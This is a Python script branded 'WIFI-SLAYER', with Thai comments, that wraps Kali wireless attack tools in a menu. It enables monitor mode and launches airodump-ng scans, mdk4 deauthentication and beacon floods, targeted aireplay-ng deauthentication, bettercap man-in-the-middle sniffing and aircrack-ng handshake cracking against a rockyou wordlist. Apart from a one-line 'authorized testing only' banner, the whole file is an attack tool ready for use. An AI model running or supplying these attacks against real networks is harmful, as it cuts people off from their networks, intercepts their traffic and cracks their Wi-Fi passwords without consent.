#!/usr/bin/env python3
import os
import time
import subprocess
import sys

# ลอง import pyfiglet ถ้าไม่มีให้แจ้งเตือน
try:
    import pyfiglet
except ImportError:
    os.system('pip install pyfiglet colorama')
    import pyfiglet

from colorama import Fore, Style, init

init(autoreset=True)

G = Fore.GREEN + Style.BRIGHT
R = Fore.RED + Style.BRIGHT
Y = Fore.YELLOW + Style.BRIGHT
B = Fore.BLUE + Style.BRIGHT
C = Fore.CYAN + Style.BRIGHT
W = Fore.WHITE + Style.BRIGHT
RESET = Style.RESET_ALL

def banner():
    os.system('clear')
    project_name = pyfiglet.figlet_format("WIFI-SLAYER", font="slant")
    print(G + project_name)
    
    # ตัวการ์ตูน Skull Hacker อลังการตามสั่ง
    print(C + r"""
             .----------.
            /          / \
           /   ______ /   \      [ DEV    : SilverBulletEX ]
          /   | ^  ^ |     \     [ VER    : 2.1 MASTER     ]
          \   |  --  |     /     [ STATUS : FULLY ARMED    ]
           \  \______/    /
            \__________  /       GITHUB: silverbulletex0-debug
          ___|________|_|____
         /                   \
        /  |  STAY STEALTH  |  \
    """)
    print(Y + " ="*30)
    print(W + "  [!] WARNING: AUTHORIZED SECURITY TESTING ONLY [!]")
    print(Y + " ="*30 + "\n")

def run_in_xterm(title, command):
    subprocess.Popen(f"sudo xterm -T '{title}' -geometry 100x30 -hold -e {command}", shell=True)

def get_interfaces():
    # หา Interface ที่มีอยู่ในเครื่อง
    interfaces = subprocess.check_output("ip -br link show | awk '{print $1}'", shell=True).decode().split()
    wifi_ifaces = [i for i in interfaces if "wlan" in i or "mon" in i]
    return wifi_ifaces

def select_interface():
    while True:
        banner()
        ifaces = get_interfaces()
        if not ifaces:
            print(R + "[-] No WiFi interfaces found! Please plug in your adapter.")
            sys.exit()
            
        print(G + "Detected Interfaces:")
        for idx, iface in enumerate(ifaces):
            # ใช้สี G, C, W ได้แล้วเพราะเป็น Global
            print(f"{W}{idx+1}. {C}{iface}")
        
        print(f"{W}--------------------------------------------------")
        try:
            choice = int(input(G + "Select Interface to use (Number): " + W))
            return ifaces[choice-1]
        except:
            print(R + "Invalid selection! Try again.")
            time.sleep(1)

def monitor_mode(interface, action):
    if action == "start":
        print(f"{Y}[*] Enabling Monitor Mode on {interface}...")
        os.system(f"sudo airmon-ng check kill > /dev/null 2>&1")
        os.system(f"sudo airmon-ng start {interface} > /dev/null 2>&1")
        # เช็คว่าชื่อกลายเป็น mon หรือยัง
        return f"{interface}mon" if "mon" not in interface else interface
    else:
        print(f"{R}[*] Restoring Network Services...")
        os.system(f"sudo airmon-ng stop {interface} > /dev/null 2>&1")
        os.system(f"sudo airmon-ng stop wlan0mon > /dev/null 2>&1")
        os.system(f"sudo airmon-ng stop wlan1mon > /dev/null 2>&1")
        os.system(f"sudo systemctl restart NetworkManager")
        print(G + "[+] Network Restored! Happy Surfing.")

def attack_menu(target_iface):
    while True:
        banner()
        print(f"{Y}ACTIVE INTERFACE: {R}{target_iface}")
        print(f"{B}="*50)
        print(G + "MAIN ATTACK SUITE (V.2.1):")
        print(W + "1. Persistent WiFi Scan (Airodump-ng)")
        print(W + "2. MDK4 - Deauth All (โจมตีหมู่)")
        print(W + "3. MDK4 - Beacon Flood (สร้างไวไฟปลอม)")
        print(W + "4. Aireplay-ng - Targeted Deauth (เตะรายคน)")
        print(W + "5. MITM - Bettercap (ดักจับข้อมูล/Sniffing)")
        print(W + "6. Crack Handshake (Aircrack-ng + Rockyou)")
        print(R + "7. EXIT & RESTORE NETWORK")
        
        choice = input(G + "\nSILVER-BULLET@KALI:~# " + W)
        
        if choice == "1":
            run_in_xterm("WIFI-SCANNER", f"airodump-ng {target_iface}")
        elif choice == "2":
            run_in_xterm("MDK4-DEAUTH", f"mdk4 {target_iface} d")
        elif choice == "3":
            run_in_xterm("MDK4-BEACON", f"mdk4 {target_iface} b -c 1")
        elif choice == "4":
            bssid = input(C + "Enter Target BSSID: " + W)
            client = input(C + "Enter Client MAC (or FF:FF:FF:FF:FF:FF): " + W)
            run_in_xterm("AIREPLAY-DEAUTH", f"aireplay-ng -0 0 -a {bssid} -c {client} {target_iface}")
        elif choice == "5":
            run_in_xterm("MITM-BETTERCAP", f"bettercap -iface {target_iface}")
        elif choice == "6":
            cap = input(C + "Path to .cap file: " + W)
            if os.path.exists(cap):
                os.system(f"aircrack-ng {cap} -w /usr/share/wordlists/rockyou.txt")
            else: print(R + "File not found!")
            input("\nPress Enter to continue...")
        elif choice == "7":
            monitor_mode(target_iface, "stop")
            print(G + "Goodbye, SilverBulletEX.")
            break

def main():
    try:
        # 1. เลือก Interface
        selected_iface = select_interface()
        
        # 2. เปิด Monitor Mode
        banner()
        ans = input(Y + f"Enable Monitor Mode on {selected_iface}? (y/n): " + W)
        if ans.lower() == 'y':
            active_iface = monitor_mode(selected_iface, "start")
        else:
            active_iface = selected_iface
            
        # 3. เข้าหน้าเมนูหลัก
        attack_menu(active_iface)
        
    except KeyboardInterrupt:
        print(R + "\n[!] Force Quit Detected. Cleaning up...")
        # พยายามกู้คืนเน็ตให้ก่อนปิด
        os.system(f"sudo systemctl restart NetworkManager > /dev/null 2>&1")
        sys.exit()

if __name__ == "__main__":
    main()
